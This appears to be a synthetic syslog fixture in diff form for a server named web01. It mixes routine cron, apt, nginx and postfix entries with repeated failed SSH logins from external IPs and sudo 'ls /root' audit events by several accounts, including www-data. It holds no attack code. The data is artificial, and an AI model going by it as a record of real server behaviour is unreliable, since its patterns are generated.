+Aug 20 02:27:15 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:27:21 web01 sshd[1414]: Accepted publickey for deploy from 10.0.5.23 port 56243 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:27:24 web01 sshd[1272]: Failed password for invalid user admin from 185.92.220.41 port 60990 ssh2 event=LOGIN_FAILED
+Aug 20 02:27:28 web01 dbus-daemon[1085]: systemd-logind: New session started
+Aug 20 02:27:32 web01 audit[424]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:27:34 web01 nginx[2648]: 200 0.421 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:27:40 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:27:45 web01 dbus-daemon[777]: systemd-logind: New session started
+Aug 20 02:27:49 web01 avahi-daemon[535]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:27:55 web01 systemd[1]: Rotate log files.
+Aug 20 02:27:59 web01 CRON[732]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:28:05 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:28:11 web01 NetworkManager[681]: DHCPv4 lease renewed on eth0
+Aug 20 02:28:13 web01 CRON[724]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:28:14 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:28:19 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:28:24 web01 apt[2670]: Cache clean: removing index files
+Aug 20 02:28:25 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:28:26 web01 dbus-daemon[1406]: systemd-logind: New session started
+Aug 20 02:28:30 web01 nginx[2581]: 200 0.353 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:28:34 web01 dbus-daemon[634]: systemd-logind: New session started
+Aug 20 02:28:39 web01 avahi-daemon[364]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:28:40 web01 NetworkManager[933]: DHCPv4 lease renewed on eth0
+Aug 20 02:28:47 web01 sshd[1327]: Failed password for invalid user user from 185.158.106.77 port 57974 ssh2 event=LOGIN_FAILED
+Aug 20 02:28:49 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:28:54 web01 systemd[1]: Rotate log files.
+Aug 20 02:28:59 web01 dbus-daemon[1046]: systemd-logind: New session started
+Aug 20 02:29:02 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:29:07 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:29:11 web01 nginx[2532]: 200 0.522 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:29:13 web01 nginx[3071]: 200 0.100 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:29:20 web01 apt[2779]: Cache clean: removing index files
+Aug 20 02:29:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:29:29 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:29:32 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:29:39 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:29:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:29:48 web01 postfix/smtpd[2974]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:29:52 web01 postfix/smtpd[2567]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:29:58 web01 apt[3298]: Cache clean: removing index files
+Aug 20 02:30:05 web01 postfix/smtpd[2669]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:30:06 web01 sshd[1413]: Failed password for invalid user admin from 185.220.101.17 port 65052 ssh2 event=LOGIN_FAILED
+Aug 20 02:30:13 web01 NetworkManager[878]: DHCPv4 lease renewed on eth0
+Aug 20 02:30:16 web01 dbus-daemon[1044]: systemd-logind: New session started
+Aug 20 02:30:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:30:30 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:30:33 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:30:38 web01 sshd[1196]: Failed password for invalid user user from 185.220.101.17 port 56121 ssh2 event=LOGIN_FAILED
+Aug 20 02:30:41 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:30:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:30:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:30:55 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:30:57 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:31:00 web01 sshd[1456]: Failed password for invalid user test from 185.158.106.77 port 55194 ssh2 event=LOGIN_FAILED
+Aug 20 02:31:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:31:14 web01 apt[2799]: Cache clean: removing index files
+Aug 20 02:31:15 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:31:16 web01 systemd[1]: Rotate log files.
+Aug 20 02:31:18 web01 audit[3447]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:31:22 web01 avahi-daemon[412]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:31:29 web01 NetworkManager[994]: DHCPv4 lease renewed on eth0
+Aug 20 02:31:36 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:31:42 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:31:46 web01 apt[2692]: Cache clean: removing index files
+Aug 20 02:31:51 web01 NetworkManager[813]: DHCPv4 lease renewed on eth0
+Aug 20 02:31:55 web01 postfix/smtpd[3384]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:31:58 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:32:04 web01 apt[4025]: Cache clean: removing index files
+Aug 20 02:32:09 web01 sshd[1252]: Accepted publickey for deploy from 10.0.5.44 port 60461 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:32:11 web01 postfix/smtpd[2453]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:32:18 web01 NetworkManager[715]: DHCPv4 lease renewed on eth0
+Aug 20 02:32:20 web01 dbus-daemon[832]: systemd-logind: New session started
+Aug 20 02:32:21 web01 CRON[849]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:32:22 web01 postfix/smtpd[2648]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:32:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:32:29 web01 systemd[1]: Rotate log files.
+Aug 20 02:32:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:32:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:32:47 web01 dbus-daemon[561]: systemd-logind: New session started
+Aug 20 02:32:50 web01 dbus-daemon[1218]: systemd-logind: New session started
+Aug 20 02:32:55 web01 avahi-daemon[414]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:32:59 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:33:06 web01 audit[890]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:33:07 web01 NetworkManager[966]: DHCPv4 lease renewed on eth0
+Aug 20 02:33:13 web01 CRON[824]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:33:19 web01 sshd[1350]: Failed password for invalid user test from 185.220.101.17 port 62840 ssh2 event=LOGIN_FAILED
+Aug 20 02:33:21 web01 systemd[1]: Rotate log files.
+Aug 20 02:33:24 web01 apt[3063]: Cache clean: removing index files
+Aug 20 02:33:31 web01 avahi-daemon[790]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:33:36 web01 CRON[815]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:33:39 web01 avahi-daemon[627]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:33:42 web01 sshd[1475]: Failed password for invalid user user from 185.220.101.17 port 52420 ssh2 event=LOGIN_FAILED
+Aug 20 02:33:44 web01 audit[3609]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:33:47 web01 apt[2989]: Cache clean: removing index files
+Aug 20 02:33:50 web01 apt[3848]: Cache clean: removing index files
+Aug 20 02:33:55 web01 avahi-daemon[447]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:34:00 web01 NetworkManager[1164]: DHCPv4 lease renewed on eth0
+Aug 20 02:34:02 web01 dbus-daemon[830]: systemd-logind: New session started
+Aug 20 02:34:06 web01 dbus-daemon[613]: systemd-logind: New session started
+Aug 20 02:34:07 web01 sshd[1166]: Accepted publickey for ubuntu from 10.0.5.23 port 63683 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:34:09 web01 audit[538]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:34:13 web01 CRON[846]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:34:19 web01 avahi-daemon[686]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:34:23 web01 sshd[1213]: Accepted publickey for deploy from 10.0.5.23 port 56002 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:34:28 web01 NetworkManager[613]: DHCPv4 lease renewed on eth0
+Aug 20 02:34:30 web01 dbus-daemon[1450]: systemd-logind: New session started
+Aug 20 02:34:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:34:40 web01 systemd[1]: Rotate log files.
+Aug 20 02:34:47 web01 postfix/smtpd[3125]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:34:48 web01 avahi-daemon[486]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:34:53 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:35:00 web01 nginx[3063]: 200 0.321 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:35:01 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:35:06 web01 postfix/smtpd[2597]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:35:11 web01 dbus-daemon[1083]: systemd-logind: New session started
+Aug 20 02:35:17 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:35:23 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:35:29 web01 sshd[1185]: Failed password for invalid user user from 89.248.165.114 port 43411 ssh2 event=LOGIN_FAILED
+Aug 20 02:35:36 web01 CRON[829]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:35:39 web01 dbus-daemon[1046]: systemd-logind: New session started
+Aug 20 02:35:44 web01 sshd[1266]: Failed password for invalid user test from 185.158.106.77 port 58025 ssh2 event=LOGIN_FAILED
+Aug 20 02:35:51 web01 postfix/smtpd[3182]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:35:57 web01 sshd[1223]: Failed password for invalid user user from 185.158.106.77 port 59936 ssh2 event=LOGIN_FAILED
+Aug 20 02:36:02 web01 systemd[1]: Rotate log files.
+Aug 20 02:36:09 web01 systemd[1]: Rotate log files.
+Aug 20 02:36:12 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:36:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:36:19 web01 systemd[1]: Rotate log files.
+Aug 20 02:36:22 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:36:24 web01 audit[3260]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:36:31 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:36:36 web01 sshd[1335]: Accepted publickey for ubuntu from 10.0.5.23 port 50618 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:36:39 web01 CRON[793]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:36:44 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:36:51 web01 nginx[2818]: 200 0.684 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:36:56 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:37:02 web01 nginx[2354]: 200 0.594 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:37:06 web01 avahi-daemon[703]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:37:12 web01 systemd[1]: Rotate log files.
+Aug 20 02:37:17 web01 dbus-daemon[538]: systemd-logind: New session started
+Aug 20 02:37:23 web01 avahi-daemon[545]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:37:24 web01 avahi-daemon[744]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:37:27 web01 nginx[2853]: 200 0.544 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:37:34 web01 CRON[891]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:37:40 web01 audit[2696]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:37:47 web01 dbus-daemon[555]: systemd-logind: New session started
+Aug 20 02:37:50 web01 sshd[1176]: Accepted publickey for deploy from 10.1.0.12 port 59255 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:37:53 web01 sshd[1444]: Accepted publickey for ubuntu from 10.0.4.17 port 50827 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:37:59 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:38:06 web01 systemd[1]: Rotate log files.
+Aug 20 02:38:08 web01 sshd[1272]: Failed password for invalid user test from 185.92.220.41 port 44331 ssh2 event=LOGIN_FAILED
+Aug 20 02:38:09 web01 sshd[1304]: Failed password for invalid user user from 45.155.23.87 port 57961 ssh2 event=LOGIN_FAILED
+Aug 20 02:38:12 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:38:19 web01 NetworkManager[738]: DHCPv4 lease renewed on eth0
+Aug 20 02:38:23 web01 systemd[1]: Rotate log files.
+Aug 20 02:38:27 web01 dbus-daemon[700]: systemd-logind: New session started
+Aug 20 02:38:32 web01 dbus-daemon[1253]: systemd-logind: New session started
+Aug 20 02:38:37 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:38:40 web01 apt[3162]: Cache clean: removing index files
+Aug 20 02:38:46 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:38:47 web01 NetworkManager[1033]: DHCPv4 lease renewed on eth0
+Aug 20 02:38:50 web01 nginx[2705]: 200 0.428 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:38:55 web01 dbus-daemon[1288]: systemd-logind: New session started
+Aug 20 02:38:58 web01 CRON[857]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:39:05 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:39:10 web01 CRON[936]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:39:17 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:39:19 web01 apt[2675]: Cache clean: removing index files
+Aug 20 02:39:20 web01 apt[2997]: Cache clean: removing index files
+Aug 20 02:39:25 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:39:26 web01 nginx[2624]: 200 0.213 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:39:30 web01 sshd[1375]: Failed password for invalid user test from 185.92.220.41 port 64248 ssh2 event=LOGIN_FAILED
+Aug 20 02:39:32 web01 CRON[840]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:39:36 web01 dbus-daemon[644]: systemd-logind: New session started
+Aug 20 02:39:42 web01 NetworkManager[618]: DHCPv4 lease renewed on eth0
+Aug 20 02:39:46 web01 systemd[1]: Rotate log files.
+Aug 20 02:39:49 web01 CRON[751]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:39:56 web01 NetworkManager[877]: DHCPv4 lease renewed on eth0
+Aug 20 02:39:57 web01 sshd[1438]: Failed password for invalid user admin from 45.155.23.87 port 52735 ssh2 event=LOGIN_FAILED
+Aug 20 02:40:00 web01 NetworkManager[968]: DHCPv4 lease renewed on eth0
+Aug 20 02:40:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:40:14 web01 audit[1046]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:40:18 web01 sshd[1405]: Accepted publickey for ubuntu from 10.0.3.11 port 57940 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:40:23 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:40:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:40:29 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:40:32 web01 sshd[1277]: Failed password for invalid user user from 185.92.220.41 port 40602 ssh2 event=LOGIN_FAILED
+Aug 20 02:40:38 web01 nginx[2619]: 200 0.740 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:40:40 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:40:47 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:40:51 web01 audit[220]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:40:56 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:40:58 web01 nginx[2281]: 200 0.502 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:40:59 web01 apt[3566]: Cache clean: removing index files
+Aug 20 02:41:05 web01 dbus-daemon[1140]: systemd-logind: New session started
+Aug 20 02:41:11 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:41:16 web01 CRON[932]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:41:21 web01 nginx[2269]: 200 0.655 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:41:23 web01 dbus-daemon[1094]: systemd-logind: New session started
+Aug 20 02:41:28 web01 NetworkManager[807]: DHCPv4 lease renewed on eth0
+Aug 20 02:41:35 web01 CRON[810]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:41:42 web01 CRON[781]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:41:43 web01 systemd[1]: Rotate log files.
+Aug 20 02:41:45 web01 nginx[2060]: 200 0.249 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:41:52 web01 nginx[2842]: 200 0.523 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:41:55 web01 sshd[1498]: Failed password for invalid user user from 185.158.106.77 port 44979 ssh2 event=LOGIN_FAILED
+Aug 20 02:41:57 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:41:58 web01 apt[3753]: Cache clean: removing index files
+Aug 20 02:42:03 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:42:08 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:42:11 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:42:13 web01 sshd[1298]: Accepted publickey for deploy from 10.0.3.11 port 53014 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:42:17 web01 sshd[1116]: Failed password for invalid user admin from 185.92.220.41 port 47414 ssh2 event=LOGIN_FAILED
+Aug 20 02:42:21 web01 apt[2530]: Cache clean: removing index files
+Aug 20 02:42:24 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:42:30 web01 NetworkManager[807]: DHCPv4 lease renewed on eth0
+Aug 20 02:42:37 web01 CRON[937]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:42:41 web01 audit[2917]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:42:44 web01 audit[1851]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:42:48 web01 apt[3745]: Cache clean: removing index files
+Aug 20 02:42:54 web01 avahi-daemon[718]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:42:57 web01 postfix/smtpd[3361]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:43:03 web01 systemd[1]: Rotate log files.
+Aug 20 02:43:08 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:43:15 web01 audit[2224]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:43:20 web01 postfix/smtpd[3152]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:43:21 web01 systemd[1]: Rotate log files.
+Aug 20 02:43:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:43:26 web01 apt[3085]: Cache clean: removing index files
+Aug 20 02:43:30 web01 CRON[856]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:43:31 web01 NetworkManager[745]: DHCPv4 lease renewed on eth0
+Aug 20 02:43:35 web01 avahi-daemon[581]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:43:36 web01 apt[2731]: Cache clean: removing index files
+Aug 20 02:43:38 web01 apt[3925]: Cache clean: removing index files
+Aug 20 02:43:43 web01 CRON[782]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:43:47 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:43:52 web01 audit[3714]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:43:56 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:44:02 web01 dbus-daemon[1228]: systemd-logind: New session started
+Aug 20 02:44:09 web01 CRON[723]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:44:10 web01 NetworkManager[971]: DHCPv4 lease renewed on eth0
+Aug 20 02:44:11 web01 sshd[1181]: Accepted publickey for deploy from 10.1.0.12 port 60028 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:44:15 web01 systemd[1]: Rotate log files.
+Aug 20 02:44:22 web01 CRON[844]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:44:29 web01 dbus-daemon[653]: systemd-logind: New session started
+Aug 20 02:44:31 web01 audit[3250]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:44:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:44:40 web01 apt[3413]: Cache clean: removing index files
+Aug 20 02:44:43 web01 dbus-daemon[620]: systemd-logind: New session started
+Aug 20 02:44:45 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:44:50 web01 apt[2525]: Cache clean: removing index files
+Aug 20 02:44:54 web01 sshd[1411]: Failed password for invalid user test from 185.220.101.17 port 40188 ssh2 event=LOGIN_FAILED
+Aug 20 02:44:58 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:45:02 web01 postfix/smtpd[2481]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:45:07 web01 dbus-daemon[750]: systemd-logind: New session started
+Aug 20 02:45:12 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:45:13 web01 CRON[867]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:45:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:45:22 web01 systemd[1]: Rotate log files.
+Aug 20 02:45:25 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:45:26 web01 postfix/smtpd[2582]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:45:28 web01 NetworkManager[1186]: DHCPv4 lease renewed on eth0
+Aug 20 02:45:35 web01 systemd[1]: Rotate log files.
+Aug 20 02:45:41 web01 systemd[1]: Rotate log files.
+Aug 20 02:45:42 web01 apt[3161]: Cache clean: removing index files
+Aug 20 02:45:45 web01 audit[377]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:45:52 web01 sshd[1341]: Failed password for invalid user user from 45.155.23.87 port 49595 ssh2 event=LOGIN_FAILED
+Aug 20 02:45:54 web01 CRON[784]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:45:59 web01 postfix/smtpd[2614]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:46:05 web01 CRON[727]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:46:10 web01 apt[3788]: Cache clean: removing index files
+Aug 20 02:46:15 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:46:21 web01 NetworkManager[894]: DHCPv4 lease renewed on eth0
+Aug 20 02:46:25 web01 dbus-daemon[824]: systemd-logind: New session started
+Aug 20 02:46:28 web01 sshd[1388]: Accepted publickey for deploy from 10.0.4.17 port 60064 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:46:32 web01 sshd[1192]: Accepted publickey for deploy from 10.0.5.44 port 63237 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:46:37 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:46:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:46:43 web01 dbus-daemon[620]: systemd-logind: New session started
+Aug 20 02:46:49 web01 audit[2620]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:46:53 web01 postfix/smtpd[2741]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:46:56 web01 systemd[1]: Rotate log files.
+Aug 20 02:46:57 web01 dbus-daemon[1206]: systemd-logind: New session started
+Aug 20 02:47:00 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:47:03 web01 nginx[2663]: 200 0.663 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:47:10 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:47:13 web01 postfix/smtpd[2982]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:47:18 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:47:20 web01 nginx[2981]: 200 0.446 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:47:24 web01 avahi-daemon[680]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:47:26 web01 sshd[1271]: Failed password for invalid user user from 89.248.165.114 port 57595 ssh2 event=LOGIN_FAILED
+Aug 20 02:47:30 web01 avahi-daemon[561]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:47:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:47:41 web01 apt[3146]: Cache clean: removing index files
+Aug 20 02:47:46 web01 sshd[1269]: Accepted publickey for ubuntu from 10.1.0.12 port 61231 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:47:53 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:47:54 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:48:01 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:48:07 web01 sshd[1299]: Accepted publickey for ubuntu from 10.1.0.12 port 59923 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:48:09 web01 systemd[1]: Rotate log files.
+Aug 20 02:48:15 web01 audit[229]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:48:18 web01 postfix/smtpd[2908]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:48:20 web01 postfix/smtpd[3249]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:48:23 web01 CRON[744]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:48:24 web01 postfix/smtpd[2438]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:48:31 web01 CRON[813]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:48:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:48:41 web01 CRON[936]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:48:45 web01 apt[3572]: Cache clean: removing index files
+Aug 20 02:48:48 web01 apt[2793]: Cache clean: removing index files
+Aug 20 02:48:55 web01 audit[3942]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:49:00 web01 NetworkManager[735]: DHCPv4 lease renewed on eth0
+Aug 20 02:49:02 web01 apt[3440]: Cache clean: removing index files
+Aug 20 02:49:06 web01 NetworkManager[1134]: DHCPv4 lease renewed on eth0
